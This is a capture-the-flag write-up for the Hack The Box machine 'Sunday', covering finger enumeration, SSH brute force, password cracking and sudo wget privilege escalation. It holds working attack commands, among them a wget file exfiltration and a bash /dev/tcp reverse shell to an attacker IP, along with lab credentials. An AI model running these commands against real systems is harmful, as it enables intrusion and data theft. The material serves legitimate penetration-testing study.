# Sunday

**OS:** Linux

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/sunday)  [2](https://app.hackthebox.com/machines/Sunday)

**Machine ip:** 10.10.10.76

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9b0413e6-da1d-4998-bc99-b6cac1fd6969)


## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.76 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ecfe88ee-793c-489d-aafa-44cfb78c700b)

+ The result shows that 5 TCP ports are open:
```
Port 79: finger?
Port 111: rpcbind 2-4
Port 515: printer
Port 6787: http
Port 22022: OpenSSH 8.4
```

+ Start off with enumerating port 79, and it is **finger** service.
+ Finger protocol is used to find out information about users on a remote system. It can be used to enumerate usernames.
+ It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.

+ Check if there are any logged in users: `finger @10.10.10.76`
+ Noone is currently logged in.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7cb9456-0efe-461d-b5a0-06af81b664e7)

+ finger can also check for details on a specific user.
+ Check if the user **root** exists: `finger root@10.10.10.76`
+ root users exists.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/245a1dcb-ff9c-4e48-9706-f602366fd3e9)

+ Get more information: `finger -l root@10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ca9c6443-0ed0-4939-a608-d640e6370d8c)

+ Enumerate for more usernames using `/usr/share/seclists/Usernames/Names/names.txt` seclists wordlist.
+ Run **powershell** on your kali attack vm: `pwsh`
+ Run the **.ps1** [script](https://github.com/h4md153v63n/PowerShell_Scripts/tree/main/finger-service_user-enum):
```
cat /usr/share/seclists/Usernames/Names/names.txt | ForEach-Object -Parallel { $user = $_ ; finger $user@10.10.10.76 | grep -E '\w{1,}.*<.*>' >> "$PWD/finger.txt" }
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dc68427f-5f8e-4a20-b00c-3f0f10708c46)

+ **Alternatively**, try to brute force usernames using the [finger-user-enum.pl](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz) script from pentestmonkey.
+ `./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/92b5af15-f73d-4323-9989-46b8f3d740b0)

+ Check the results of finger for a username whether it exists.
+ `finger sammy@10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f7f3fe42-1dc8-40e4-81fa-270c90771f3a)

+ `finger sunny@10.10.10.76`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a850e194-3edd-4c87-ae0d-cfa64c342f0a)

+ **sammy** and **sunny** users exist, and **test** user doesn't exist.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/edfc743d-7113-4830-94f0-979bf6bbd8b6)


## Gaining Access
+ SSH is open, and there are 2 valid usernames: **sammy** and **sunny**
+ Brute force the users' credentials using hydra.
```
hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022 -f -t 40
```

+ `sunny`:`sunday` username and password found.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3056ebf9-733d-4644-a26c-b91a787cab77)

+ Login ssh: `ssh -p 22022 sunny@10.10.10.76`
+ We got the low level access.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/75521922-5eea-4e98-8c9a-b44f26b5bd71)


## Privilege Escalation: from 'sunny' to 'sammy'
+ We need to escalate our privileges to Sammy.
+ Check **shadow.backup** in **/backup** directory.
+ It's a backup of the shadow file, and that is world readable.
```
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/902fc75b-9066-4b8d-801d-16e692e7082f)

+ We already know sunny's password therefore we're not going to crack it.
+ Use john or hashcat to crack the hash.

**Using john:**
+ Now, copy **sammy**'s password hash, and save it in the file **hash.txt**. 
+ `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/321c70bc-5af0-4fd6-92c4-5b02ae02a4a4)

+ `john hash.txt --show`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/66bdf411-8ca1-4b95-859e-3dac32645544)


**Using hashcat:**
+ Now, copy **sammy**'s password hash, and save in the **hash** file.
+ Determine which type of hash algorithm: `hashid hash`
+ `hashcat -h | grep SHA256`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/66330abf-4cc2-41bc-8f40-1cb29e9f3caf)

+ **Alternatively**, specify the hash type from checking [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f0658f0b-36d3-4081-9d7a-4c93ece481f0)

+ `hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt --force`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b004bd76-5a97-48ee-96b0-52036b0aeec1)

+ `hashcat hash --show`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/82fae4ab-8672-403b-8bbb-6dacc755fe04)

+ **Cracked** `sammy`:`cooldude!`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd51bb99-c289-4229-b878-3db5082ddba4)

+ Login ssh `sammy`:`cooldude!`: `ssh sammy@10.10.10.76 -p 22022`
+ Get the user flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ae58cbf1-749c-4d00-b846-98da777ca45c)

## Privilege Escalation: from 'sammy' to 'root'

### Method 1
+ Run `sudo -ll` command to view the list of allowed commands the user can run as root.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/36f1c0e0-6503-4515-8f63-25179f3be8b4)

+ Check [wget](https://gtfobins.github.io/gtfobins/wget/) on gtfobins.
+ Try [sudo](https://gtfobins.github.io/gtfobins/wget/#sudo)
```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

+ Get the root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4e469a93-aad2-4338-a806-18c7ae8d33c1)


### Method 2
+ On **sammy**'s session, send **root.txt** to your kali attack vm: `sudo wget --post-file /root/root.txt http://10.10.14.8:5555/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/04c2786a-bd1c-4846-b1e3-660ffdaa24ed)


### Method 3
+ On **sunny**'s session, view the list of allowed commands that the user can run with root privileges: `sudo -ll`
+ We don't have write access to the script, so we can't escalate our privileges using it.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/afd94b35-eb23-48b4-b1ef-2960847d9e3a)

+ Pass to **sammy**'s session, and view the list of allowed commands the user can run as root.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3e31b1c4-2cde-49dc-994f-b66278ab6f04)

+ **Terminal [1]:** Create a **rev_shell.py** file on your kali attack vm, and serve it with SimpleHTTPServer.
```
#!/usr/bin/env python
import os
import sys
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"')
```

+ **Terminal [2]:** Start listener on your kali attack vm: `nc -lnvp 4444`
+ **Terminal [3]:** On sammy's session, download request **rev_shell.py** with wget, using the `-O` option, which will allow us to specify a file to write the wget output to, and it will overwrite that file if it already exists.
```
sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
```

+ **Terminal [4]:** On sunny's session, run it with sunny: `sudo /root/troll`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ee1abc40-ef93-490b-8150-376696d7e990)

+ **Terminal [2][5]:** Get the root shell.
+ On method 3, be quick. That’s because of the overwrite script resetting troll to it's original self every 5 seconds.
+ After getting the root shell, there's **overwrite** script in the root home directory in the below.
+ **troll** is set back to its default state regularly every 5 seconds.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/be491ee5-fad3-4815-adee-59400f8fc964)

+ **Alternatively**, the logic here is **overwrite** in the similar way, and hence try them.
+ **Overwrite troll with '/bin/bash' or 'cat /root/root.txt'**, **Overwrite Different SUID Binary**, **Overwrite shadow**, and **Overwrite sudoers** methods.
+ **The logic here is that wget, which works with root privileges, assigns root permissions to the files it downloads or overwrites.**

# References & Alternatives
+ https://vvmlist.github.io/#poison
+ https://0xdf.gitlab.io/2018/09/29/htb-sunday.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/sunday-writeup-w-o-metasploit
+ https://benheater.com/hackthebox-sunday/
+ https://medium.com/@Inching-Towards-Intelligence/htb-sunday-62-100-faf28831de11
+ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/sunday
+ https://medium.com/@joemcfarland/hack-the-box-sunday-writeup-c2dcee3593d8
+ https://medium.com/ctf-writeups/sunday-write-up-htb-c5993ba78c9

# More
+ **Pentesting Finger:** https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger
